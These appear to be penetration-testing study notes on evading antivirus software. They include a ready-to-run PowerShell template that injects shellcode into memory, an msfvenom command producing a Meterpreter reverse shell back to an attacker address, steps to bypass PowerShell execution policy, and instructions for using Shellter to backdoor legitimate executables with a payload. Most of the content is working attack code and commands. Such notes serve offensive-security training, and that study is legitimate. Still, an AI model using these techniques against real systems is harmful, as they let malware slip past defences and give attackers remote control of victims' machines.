# Anti-Virus Evasion

#### Remote Process Memory Injection
> This technique attempts to inject the payload into another valid PE that is not malicious, usually by leveraging a set of Windows APIs.

With Windows APIs:
- *OpenProcess* to obtain a valid HANDLE to a target process that you have permissions to access
-  *VirtualAlloc* to allocate memory in the context of that process
-  *WriteProcessMemory* to copy the malicious payload to the newly allocated memory
-  *CreateRemoteThread* to execute the malcious payload in memory in a seperate thread

WIth PowerShell:
> PowerShell can interact with the Windows API and executing a script rather than a PE makes it difficult for AV products to detect malicious code as it is ran inside an interpreter. Also, if the code is marked as malicious it can be easily changed without needing to recompile anything
- template script that performs memory injection:
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace in32Functions -passthru;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
- generate shellcode using `msfvenom`
	- i.e. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell`
	- rename the `$buf` variable from `msfvenom` with `$sc`, as required by the script 
- execute with: `powershell .\av_test.ps1`
- you may need to change the PowerShell Execute Policy settings to get the script to run:
	- i.e. `powershell` -> `Get-ExecutionPolicy -Scope CurrentUser` (should return "Undefined") -> `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` -> `Get-ExecutionPolicy -Scope CurrentUser` (should return "Unrestrcited")
- or you can run the script with the `-ExecutionPolicy Bypass` flag

<br>

#### Shelter
> Shelter is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software. It uses a number of novel and advanced techniques to essentially backdoor a valid and non-malicious executable file with a malicious shellcode payload.

- installation: `sudo apt update && sudo apt install shellter wine` 
- shellter can run in one of two modes:
	- in *Auto* mode the tool's console guides you through options for configuring the executable
	- in *Manual* mode the tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level to highly customize the injection process in case the automatically selected options fail
- the Stealth Mode option means the injected binary will behave normally to avoid suspcious, but if you use a custom payload with this option it must terminate by exiting the current thread
- once run on a target system, the shell the executable creates will close if the process is terminated (i.e. if an installer executable finshes installing or the user closes the program)
- to overcome this it is recommended to use Meterpreter's `AutoRunScript` option to migrate to a seperate stable process immediately after session creation
	- i.e. `set AutoRunScript post/windows/manage/migrate`

